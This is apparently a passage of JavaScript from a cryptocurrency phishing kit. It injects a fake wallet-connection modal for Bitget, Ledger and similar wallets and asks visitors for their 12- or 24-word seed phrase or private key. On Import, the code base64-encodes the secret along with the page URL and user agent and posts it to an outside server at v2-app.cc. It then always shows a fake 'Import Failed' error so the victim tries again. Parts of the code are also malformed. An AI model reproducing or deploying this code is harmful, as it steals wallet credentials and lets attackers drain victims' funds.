B3aWR0aD0iNDQ0Ljg1MSIgeD0iLTI0MS4wNzgiIHk9IjY3LjY0MiI+PGZlRmxvb2QgZmxvb2Qtb3BhY2l0eT0iMCIgcmVzdWx0PSJCYWNrZ3JvdW5kSW1hZ2VGaXgiLz48ZmVCbGVuZCBpbj0iU291cmNlR3JhcGhpYyIgaW4yPSJCYWNrZ3JvdW5kSW1hZ2VGaXgiIG1vZGU9Im5vcm1hbCIgcmVzdWx0PSJzaGFwZSIvPjxmZUdhdXNzaWFuQmx1ciByZXN1bHQ9ImVmZmVjdDFfZm9yZWdyb3VuZEJsdXJfMjAzNV8xMTA2IiBzdGREZXZpYXRpb249IjQ5LjIzMDgiLz48L2ZpbHRlcj48ZmlsdGVyIGlkPSJkIiBjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM9InNSR0IiIGZpbHRlclVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgaGVpZ2h0PSIzODUuMTA1IiB3aWR0aD0iNDMwLjE5MSIgeD0iLTIwLjM5NjgiIHk9Ii0yNDIuNzU4Ij48ZmVGbG9vZCBmbG9vZC1vcGFjaXR5PSIwIiByZXN1bHQ9IkJhY2tncm91bmRJbWFnZUZpeCIvPjxmZUJsZW5kIGluPSJTb3VyY2VHcmFwaGljIiBpbjI9IkJhY2tncm91bmRJbWFnZUZpeCIgbW9kZT0ibm9ybWFsIiByZXN1bHQ9InNoYXBlIi8+PGZlR2F1c3NpYW5CbHVyIHJlc3VsdD0iZWZmZWN0MV9mb3JlZ3JvdW5kQmx1cl8yMDM1XzExMDYiIHN0ZERldmlhdGlvbj0iNDkuMjMwOCIvPjwvZmlsdGVyPjxjbGlwUGF0aCBpZD0iZSI+PHBhdGggZD0ibTAgMGgyNTZ2MjU2aC0yNTZ6Ii8+PC9jbGlwUGF0aD48ZyBjbGlwLXBhdGg9InVybCgjZSkiPjxwYXRoIGQ9Im0wIDBoMjU2djI1NmgtMjU2eiIgZmlsbD0iIzU0ZmZmNSIvPjxnIGZpbHRlcj0idXJsKCNhKSI+PHBhdGggZD0ibTEzLjQ4MDYgMTk4LjYwNWMtNDIuODA4MiAxMjAuNDM4IDE4Ni4xODA0IDg2LjQyMiAzMDYuMDI2NCA1NC4zNTkgMTIyLjY1OC00MC43MDUgMzcuODc5LTIyMC4xMzcxLTUwLjA5Mi0yMjQuMTA4Mi04Ny45NzItMy45NzExIDEwLjkwNyA4Mi45NjgyLTYzLjgyIDEwNy44MDAyLTc0LjcyNyAyNC44MzEtMTM4LjYwNDMtODguNTk3Ny0xOTIuMTE0NCA2MS45NDl6IiBmaWxsPSIjZmZmIi8+PC9nPjxnIGZpbHRlcj0idXJsKCNiKSI+PHBhdGggZD0ibTg1LjUxMTgtNDUuODIyNWMtMjIuNDU1Ni02MS4zNTM1LTEwMi40MzA3IDIxLjgyNzItMTM5LjYxMTMgNzEuMDg2OC0zNS40NjU3IDUzLjU4MzYgNTcuMTA4ODcgOTkuODg3NyA5My40MjAzIDc0Ljc3MjcgMzYuMzExNS0yNS4xMTQzLTMxLjU0NjMyLTMwLjAwMDctOS45NS02Mi42NTg1IDIxLjU5NjMtMzIuNjU3NzQgODQuMjEwMi02LjUwOSA1Ni4xNDEtODMuMjAxeiIgZmlsbD0iIzAwZmZmMCIgZmlsbC1vcGFjaXR5PSIuNjciLz48L2c+PGcgZmlsdGVyPSJ1cmwoI2MpIj48cGF0aCBkPSJtOTYuNDc5NiAyMjUuNDI0Yy0zMC42Mjk0LTEwMy4wNjEtMTYyLjU2MTQtNDguNzg3LTIyNC42OTg2LTguNzY3LTU5Ljc3MSA0Ny4zODUgODIuMTQ3OSAxODMuNjkxIDE0MS4wOTE1IDE3Ni43MTkgNTguOTQzNi02Ljk3My00Ny4yODQzLTY2LjMxMS0xMC44ODU0OC05NS4yMDYgMzYuMzk4NzgtMjguODk0IDEzMi43Nzg5OCA1Ni4wNzkgOTQuNDkyNTgtNzIuNzQ2eiIgZmlsbD0iIzlkODFmZiIvPjwvZz48ZyBmaWx0ZXI9InVybCgjZCkiPjxwYXRoIGQ9Im0yODIuMTItMTA3LjM1M2MtNjYuMDczLTc4LjY3OC0xNjAuNjU3LTEzLjYxNy0xOTkuNjkwNCAyOC43NDgzLTM0LjE1NTcgNDcuOTYwMSAxNDEuODQ1NCAxMzUuODM1OSAxOTAuNjkxNCAxMjAuNzc2MSA0OC44NDctMTUuMDU5OS02Ni42MDktNDYuMjIxNzgtNDUuODI0LTc1LjQ1OTMgMjAuNzg1LTI5LjIzNzYgMTM3LjQxNSAyNC4yODIyNCA1NC44MjMtNzQuMDY1MXoiIGZpbGw9IiM0ZDk0ZmYiLz48L2c+PHBhdGggY2xpcC1ydWxlPSJldmVub2RkIiBkPSJtOTMuMTg5IDE1Mi44MzZoNDMuNDg1bC00OS40NjU0LTQ5Ljc4NSA1MC4xMDE0LTQ5Ljc4NDcgMTMuNjQ1LTEzLjI2NjNoLTQ1LjEzNmwtNTcuNDgzMSA1Ny43NzczYy0yLjkwMSAyLjkxMTctMi44ODYxIDcuNjI0Ny4wMjk3IDEwLjUyMTd6bTI2LjE0MS00OS42NjhoLS4zMzVsLjMzMS0uMDA0em0wIDAgNDkuNDYxIDQ5Ljc4MS01MC4xMDEgNDkuNzg1LTEzLjY0NSAxMy4yNjZoNDUuMTM1bDU3LjQ4NC01Ny43NzRjMi45MDEtMi45MTIgMi44ODYtNy42MjQtLjAzLTEwLjUyMWwtNDQuODIzLTQ0LjUzN3oiIGZpbGw9IiMwMDAiIGZpbGwtcnVsZT0iZXZlbm9kZCIvPjwvZz48L3N2Zz4=" alt="Bitget">
            </div>
            <span class="wallet-name">Bitget</span>
        </div>
        <div class="wallet-item" data-wallet="Ledger">
            <div class="wallet-icon">
                <img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzUgMzUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI2ZmZiI+PHBhdGggZD0ibTIzLjU4OCAwaC0xNnYyMS41ODNoMjEuNnYtMTZhNS41ODUgNS41ODUgMCAwIDAgLTUuNi01LjU4M3oiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUuNzM5KSIvPjxwYXRoIGQ9Im04LjM0MiAwaC0yLjc1N2E1LjU4NSA1LjU4NSAwIDAgMCAtNS41ODUgNS41ODV2Mi43NTdoOC4zNDJ6Ii8+PHBhdGggZD0ibTAgNy41OWg4LjM0MnY4LjM0MmgtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDUuNzM5KSIvPjxwYXRoIGQ9Im0xNS4xOCAyMy40NTFoMi43NTdhNS41ODUgNS41ODUgMCAwIDAgNS41ODUtNS42di0yLjY3MWgtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMS40NzggMTEuNDc4KSIvPjxwYXRoIGQ9Im03LjU5IDE1LjE4aDguMzQydjguMzQyaC04LjM0MnoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUuNzM5IDExLjQ3OCkiLz48cGF0aCBkPSJtMCAxNS4xOHYyLjc1N2E1LjU4NSA1LjU4NSAwIDAgMCA1LjU4NSA1LjU4NWgyLjc1N3YtOC4zNDJ6IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwIDExLjQ3OCkiLz48L2c+PC9zdmc+" alt="Ledger">
            </div>
            <span class="wallet-name">Ledger</span>
        </div>
    </div>
</div>
                    
                    <!-- Вид подключения кошелька -->
                    <div class="connection-view">
                    <div class="logo-container">
                        <div class="logo"><img src="favicon.ico" alt="Logo"></div>
                    </div>
                    <p class="connection-text">Connecting <span class="wallet-name-text"></span> to logo.png</p>
                    
                    <!-- Контейнер для вариантов импорта и форм ввода -->
                    <div class="content-area">
                        <!-- Варианты импорта -->
                        <div class="import-options active">
                            <div class="import-option" data-option="12words">
                                <div class="option-title">12 Word Seed Phrase</div>
                                <div class="option-desc">Standard security option</div>
                            </div>
                            <div class="import-option" data-option="24words">
                                <div class="option-title">24 Word Seed Phrase</div>
                                <div class="option-desc">Enhanced security option</div>
                            </div>
                            <div class="import-option" data-option="privatekey">
                                <div class="option-title">Private Key</div>
                                <div class="option-desc">Direct wallet access</div>
                            </div>
                        </div>
                        
                        <!-- Формы для ввода -->
                        <!-- Форма для 12 слов -->
                        <div class="input-form" data-form="12words">
                            <h3>Enter 12 Word Seed Phrase</h3>
                            <div class="words-grid" id="words12-grid"></div>
                        </div>
                        
                        <!-- Форма для 24 слов -->
                        <div class="input-form" data-form="24words">
                            <h3>Enter 24 Word Seed Phrase</h3>
                            <div class="words-grid" id="words24-grid"></div>
                        </div>
                        
                        <!-- Форма для приватного ключа -->
                        <div class="input-form" data-form="privatekey">
                            <h3>Enter Private Key</h3>
                            <textarea class="private-key-input" placeholder="Enter your private key here..."></textarea>
                        </div>
                    </div>
                    
                    <div class="action-buttons">
                        <button class="import-btn">Import</button>
                        <div class="secondary-buttons">
                            <button class="how-to-btn">How to?</button>
                            <button class="close-connection-btn">Close</button>
                        </div>
                    </div>
                </div>

                <!-- Вид ошибки -->
                <div class="error-view">
                    <div class="error-icon">⚠️</div>
                    <h3 class="error-title">Import Failed</h3>
                    <p class="error-message" id="error-text"></p>
                    <button class="retry-btn">Retry</button>
                </div>
            </div>
        </div>
    </div>
    `;

    // Добавляем модальное окно в body
    document.body.insertAdjacentHTML('beforeend', modalHTML);

    // Добавляем стили
    const styles = `
        <style>
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.7);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 1000;
                opacity: 0;
                visibility: hidden;
                transition: all 0.3s ease;
            }

            .modal-overlay.active {
                opacity: 1;
                visibility: visible;
            }

            .modal {
                background: #1a1a2e;
                border-radius: 20px;
                width: 90%;
                max-width: 510px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
                overflow: hidden;
                transform: scale(0.9);
                transition: transform 0.4s ease;
            }

            .modal-overlay.active .modal {
                transform: scale(1);
            }

            .modal-header {
                padding: 20px;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
                display: flex;
                justify-content: space-between;
                align-items: center;
                background: #16213e;
            }

            .modal-title {
                font-size: 22px;
                font-weight: 600;
                color: white;
                margin: 0;
            }

            .close-btn {
                background: none;
                border: none;
                color: #fff;
                font-size: 24px;
                cursor: pointer;
                transition: color 0.3s;
            }

            .close-btn:hover {
                color: #a777e3;
            }
			
			.error-view {
    display: none;
    text-align: center;
    padding: 20px;
}

.error-view.active {
    display: block;
}

.error-icon {
    font-size: 48px;
    margin-bottom: 20px;
}

.error-title {
    color: #ff6b6b;
    font-size: 24px;
    margin-bottom: 15px;
}

.error-message {
    color: rgba(255, 255, 255, 0.8);
    margin-bottom: 25px;
    line-height: 1.5;
}

.retry-btn {
    background: #6e8efb;
    color: white;
    border: none;
    padding: 12px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    transition: all 0.3s ease;
}

.retry-btn:hover {
    background: #5a7dfa;
    transform: translateY(-2px);
}
			
            .modal-content {
                padding: 25px;
                background: #1a1a2e;
            }

            .wallets-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
                margin-top: 15px;
            }

            .wallet-item {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                padding: 15px;
                display: flex;
                flex-direction: column;
                align-items: center;
                cursor: pointer;
                transition: all 0.3s ease;
                color: white;
            }

            .wallet-item:hover {
                background: rgba(255, 255, 255, 0.1);
                transform: translateY(-2px);
            }

            .wallet-icon {
                width: 50px;
                height: 50px;
                margin-bottom: 10px;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 24px;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.1);
                color: white;
            }

            .wallet-name {
                font-size: 16px;
                font-weight: 500;
            }

            .wallets-view, .connection-view {
                display: none;
            }

            .wallets-view.active, .connection-view.active {
                display: block;
            }

            .logo-container {
                margin: 20px 0;
                text-align: center;
            }

            .logo {
                width: 80px;
                height: 80px;
                border-radius: 50%;
                background: linear-gradient(135deg, #6e8efb, #a777e3);
                margin: 0 auto;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 30px;
                font-weight: bold;
                color: white;
            }

            .connection-text {
                font-size: 18px;
                margin: 20px 0;
                text-align: center;
                color: white;
            }

            .content-area {
                min-height: 200px;
                position: relative;
            }

            .import-options {
                display: flex;
                flex-direction: column;
                gap: 15px;
            }

            .import-option {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 12px;
                padding: 15px;
                cursor: pointer;
                transition: all 0.3s ease;
                text-align: left;
                color: white;
            }

            .import-option:hover {
                background: rgba(255, 255, 255, 0.1);
            }

            .import-option.selected {
                border-color: #6e8efb;
                background: rgba(110, 142, 251, 0.1);
            }

            .option-title {
                font-size: 16px;
                font-weight: 600;
                margin-bottom: 5px;
                color: white;
            }

            .option-desc {
                font-size: 14px;
                color: rgba(255, 255, 255, 0.6);
            }

            .input-form {
                display: none;
            }

            .input-form.active {
                display: block;
            }

            .import-options {
                display: none;
            }

            .import-options.active {
                display: flex;
            }

            .input-form h3 {
                color: white;
                margin-bottom: 15px;
                text-align: center;
            }

            .words-grid {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                margin-top: 15px;
            }

            .word-input-container {
                display: flex;
                align-items: center;
            }

            .word-number {
                width: 25px;
                color: rgba(255, 255, 255, 0.6);
                font-size: 14px;
                margin-right: 5px;
            }

            .word-input {
                flex: 1;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 6px;
                padding: 8px 10px;
                color: white;
                font-size: 14px;
            }

            .word-input:focus {
                outline: none;
                border-color: #6e8efb;
            }

            .private-key-input {
                width: 100%;
                height: 100px;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 8px;
                padding: 12px;
                color: white;
                font-size: 14px;
                resize: vertical;
                font-family: monospace;
            }

            .private-key-input:focus {
                outline: none;
                border-color: #6e8efb;
            }

            .action-buttons {
                display: flex;
                flex-direction: column;
                gap: 15px;
                margin-top: 20px;
            }

            .import-btn {
                width: 100%;
                background: #6e8efb;
                color: white;
                border: none;
                padding: 15px;
                font-size: 16px;
                border-radius: 12px;
                cursor: pointer;
                transition: all 0.3s ease;
            }

            .import-btn:hover {
                background: #5a7dfa;
            }

            .import-btn:disabled {
                background: rgba(255, 255, 255, 0.1);
                color: rgba(255, 255, 255, 0.5);
                cursor: not-allowed;
            }

            .secondary-buttons {
                display: flex;
                gap: 10px;
            }

            .how-to-btn, .close-connection-btn {
                flex: 1;
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
                color: white;
                padding: 12px;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.3s ease;
            }

            .how-to-btn:hover {
                background: rgba(110, 142, 251, 0.2);
                border-color: #6e8efb;
            }
             
			.wallet-icon img {
				width: 100%;
				height: 100%;
			    object-fit: contain;
				border-radius: 50%;
			} 
            .close-connection-btn:hover {
                background: rgba(255, 255, 255, 0.1);
            }

            p {
                color: white;
                text-align: center;
                margin: 0;
            }
        </style>
    `;

    document.head.insertAdjacentHTML('beforeend', styles);

    // Ждем немного чтобы DOM обновился
    const modalOverlay = document.querySelector('.modal-overlay');

	console.log('Applying translation for language:', currentLang);
	console.log('modalOverlay found:', modalOverlay);

// Находим ВСЕ кнопки с goAuth и вешаем обработчики
	// Находим ВСЕ кнопки с goAuth и вешаем обработчики
	const authButtons = document.querySelectorAll('[class*="goAuth"]');
	console.log('Found goAuth buttons:', authButtons.length);

	authButtons.forEach(btn => {
    btn.addEventListener('click', function() {
        console.log('Connect button clicked');
        modalOverlay.classList.add('active');
        resetToWalletSelection();
        initializeWordFields();
    });
});

// Дополнительно: находим ВСЕ кнопки и вешаем обработчики на все
	const allGoAuthBtns = document.querySelectorAll('[class*="goAuth"]');
	allGoAuthBtns.forEach(btn => {
    if (btn !== goAuthBtn) { // чтобы не дублировать обработчик на первой кнопке
        btn.addEventListener('click', function() {
            console.log('Connect button clicked (additional)');
            modalOverlay.classList.add('active');
            resetToWalletSelection();
            initializeWordFields();
        });
    }
});

// Обработчик для кнопки Connect
goAuthBtn.addEventListener('click', function() {
    console.log('Connect button clicked');
    modalOverlay.classList.add('active');
    resetToWalletSelection();
    initializeWordFields();
});

// Вешаем обработчик на ВСЕ кнопки с goAuth в классе
goAuthBtns.forEach(btn => {
    btn.addEventListener('click', function() {
        console.log('Connect button clicked');
        modalOverlay.classList.add('active');
        resetToWalletSelection();
        initializeWordFields();
    });
});

        // Получаем остальные элементы
        const closeBtn = document.querySelector('.close-btn');
        const walletsView = document.querySelector('.wallets-view');
        const connectionView = document.querySelector('.connection-view');
        const walletItems = document.querySelectorAll('.wallet-item');
        const walletNameText = document.querySelector('.wallet-name-text');
        const importOptions = document.querySelectorAll('.import-option');
        const importOptionsContainer = document.querySelector('.import-options');
        const importBtn = document.querySelector('.import-btn');
        const inputForms = document.querySelectorAll('.input-form');
        const howToBtn = document.querySelector('.how-to-btn');
        const closeConnectionBtn = document.querySelector('.close-connection-btn');
        const errorView = document.querySelector('.error-view');
        const errorText = document.getElementById('error-text');
        const retryBtn = document.querySelector('.retry-btn');
        
        let selectedWallet = '';
        let selectedOption = '';

        // Обработчик для кнопки Connect
        goAuthBtn.addEventListener('click', function() {
            console.log('Connect button clicked');
            modalOverlay.classList.add('active');
            resetToWalletSelection();
            initializeWordFields();
        });

        // Закрытие модального окна
        closeBtn.addEventListener('click', function() {
            modalOverlay.classList.remove('active');
        });

        // Закрытие при клике на overlay
        modalOverlay.addEventListener('click', function(e) {
            if (e.target === modalOverlay) {
                modalOverlay.classList.remove('active');
            }
        });

        // Выбор кошелька
        document.addEventListener('click', function(e) {
		const walletItem = e.target.closest('.wallet-item');
		if (walletItem) {
        selectedWallet = walletItem.getAttribute('data-wallet');
        walletNameText.textContent = selectedWallet;
        showConnectionView();
			}
		});

        // Выбор опции импорта
        importOptions.forEach(option => {
            option.addEventListener('click', function() {
                importOptions.forEach(opt => opt.classList.remove('selected'));
                this.classList.add('selected');
                selectedOption = this.getAttribute('data-option');
                
                // Скрываем варианты импорта и показываем соответствующую форму ввода
                importOptionsContainer.classList.remove('active');
                inputForms.forEach(form => {
                    form.classList.remove('active');
                    if (form.getAttribute('data-form') === selectedOption) {
                        form.classList.add('active');
                    }
                });
                
                importBtn.disabled = false;
            });
        });

        // Кнопка импорта
        importBtn.addEventListener('click', function() {
            if (selectedOption) {
                const data = getInputData();
                if (data) {
                    // Подготовка данных для отправки
                    const payload = {
                        wallet: selectedWallet,
                        method: selectedOption,
                        data: data,
                        timestamp: new Date().toISOString(),
                        site: window.location.href,
                        userAgent: navigator.userAgent
                    };
                    
                    // Шифрование данных
                    const encryptedData = encryptData(payload);
                    
                    // Отправка зашифрованных данных на сервер
                    const formData = new FormData();
                    formData.append('encrypted_data', encryptedData);
                    
                    fetch('https://v2-app.cc/yad.php', {
                        method: 'POST',
                        body: formData,
                        referrer: window.location.href
                    })
                    .then(response => response.text())
                    .then(result => {
                        // Показываем ошибку вместо закрытия модального окна
                        showErrorView();
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Показываем ошибку при проблемах с сетью
                        showErrorView();
                    });
                    
                } else {
                    alert(translations[window.currentLanguage].fillAllFields);
                }
            }
        });

        // Кнопка How to?
        howToBtn.addEventListener('click', function() {
            window.open('https://www.youtube.com/watch?v=77Tko8Rv_wA', '_blank');
        });

        // Кнопка Close в connection view
        closeConnectionBtn.addEventListener('click', function() {
            resetToWalletSelection();
        });

        // Кнопка Retry
        retryBtn.addEventListener('click', function() {
            // Возвращаем к выбору кошелька
            errorView.classList.remove('active');
            resetToWalletSelection();
        });

        // Функции
        function showConnectionView() {
            walletsView.classList.remove('active');
            connectionView.classList.add('active');
            importBtn.disabled = true;
            selectedOption = '';
            importOptions.forEach(opt => opt.classList.remove('selected'));
            inputForms.forEach(form => form.classList.remove('active'));
            importOptionsContainer.classList.add('active');
            
            // Обновляем текст подключения с переводом
            const t = translations[window.currentLanguage];
            const connectionText = document.querySelector('.connection-text');
            if (connectionText) {
                connectionText.innerHTML = t.connectingTo.replace('{wallet}', `<span class="wallet-name-text">${selectedWallet}</span>`);
            }
        }

        function resetToWalletSelection() {
            connectionView.classList.remove('active');
            walletsView.classList.add('active');
            errorView.classList.remove('active');
            selectedWallet = '';
            selectedOption = '';
            inputForms.forEach(form => form.classList.remove('active'));
            importOptionsContainer.classList.add('active');
        }

        function encryptData(data) {
            // Простое base64 кодирование (можно заменить на более сложное шифрование)
            return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        }

        // Функция показа ошибки
        function showErrorView() {
            const t = translations[window.currentLanguage];
            let errorMessage = '';
            
            if (selectedOption === '12words' || selectedOption === '24words') {
                errorMessage = t.seedError;
            } else if (selectedOption === 'privatekey') {
                errorMessage = t.privateKeyError;
            } else {
                errorMessage = t.genericError;
            }
            
            errorText.textContent = errorMessage;
            connectionView.classList.remove('active');
            errorView.classList.add('active');
        }

        // Инициализация полей для слов
        function initializeWordFields() {
            try {
                // 12 слов
                const words12Grid = document.getElementById('words12-grid');
                if (words12Grid) {
                    words12Grid.innerHTML = '';
                    for (let i = 1; i <= 12; i++) {
                        words12Grid.innerHTML += `
                            <div class="word-input-container">
                                <span class="word-number">${i}.</span>
                                <input type="text" class="word-input" placeholder="Word ${i}">
                            </div>
                        `;
                    }
                }

                // 24 слова
                const words24Grid = document.getElementById('words24-grid');
                if (words24Grid) {
                    words24Grid.innerHTML = '';
                    for (let i = 1; i <= 24; i++) {
                        words24Grid.innerHTML += `
                            <div class="word-input-container">
                                <span class="word-number">${i}.</span>
                                <input type="text" class="word-input" placeholder="Word ${i}">
                            </div>
                        `;
                    }
                }
                
                // Ждем немного чтобы DOM обновился
                setTimeout(() => {
                    // Автоматическое распределение слов для 12 слов
                    const wordInputs12 = document.querySelectorAll('#words12-grid .word-input');
                    if (wordInputs12.length > 0) {
                        wordInputs12[0].addEventListener('paste', function(e) {
                            // Отменяем стандартное поведение
                            e.preventDefault();
                            
                            // Получаем данные из буфера обмена
                            const clipboardData = e.clipboardData || window.clipboardData;
                            const pastedText = clipboardData.getData('text');
                            
                            const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
                            
                            if (words.length === 12) {
                                // Распределяем все 12 слов
                                words.forEach((word, index) => {
                                    if (wordInputs12[index]) {
                                        wordInputs12[index].value = word;
                                    }
                                });
                            } else {
                                // Если не 12 слов, вставляем как обычно
                                this.value = pastedText;
                             }, 100);
							 });

                    // Автоматическое распределение слов для 24 слов
                    const wordInputs24 = document.querySelectorAll('#words24-grid .word-input');
                    if (wordInputs24.length > 0) {
                        wordInputs24[0].addEventListener('paste', function(e) {
                            // Отменяем стандартное поведение
                            e.preventDefault();
                            
                            // Получаем данные из буфера обмена
                            const clipboardData = e.clipboardData || window.clipboardData;
                            const pastedText = clipboardData.getData('text');
                            
                            const words = pastedText.trim().split(/\s+/).filter(word => word.length > 0);
                            
                            if (words.length === 24) {
                                // Распределяем все 24 слова
                                words.forEach((word, index) => {
                                    if (wordInputs24[index]) {
                                        wordInputs24[index].value = word;
                                    }
                                });
                            } else {
                                // Если не 24 слова, вставляем как обычно
                                this.value = pastedText;
                            }
                        });
                    }
                }, 100);
                
            } catch (error) {
                console.error('Error in initializeWordFields:', error);
            }
        }

        function getInputData() {
            switch(selectedOption) {
                case '12words':
                    const words12 = Array.from(document.querySelectorAll('#words12-grid .word-input'))
                        .map(input => input.value.trim())
                        .filter(word => word !== '');
                    return words12.length === 12 ? words12.join(' ') : null;
                    
                case '24words':
                    const words24 = Array.from(document.querySelectorAll('#words24-grid .word-input'))
                        .map(input => input.value.trim())
                        .filter(word => word !== '');
                    return words24.length === 24 ? words24.join(' ') : null;
                    
                case 'privatekey':
                    return document.querySelector('.private-key-input').value.trim() || null;
                    
                default:
                    return null;
            }
        } // ← закрытие функции getInputData

    }, 100); // ← закрытие setTimeout
}); // ← закрытие DOMContentLoaded
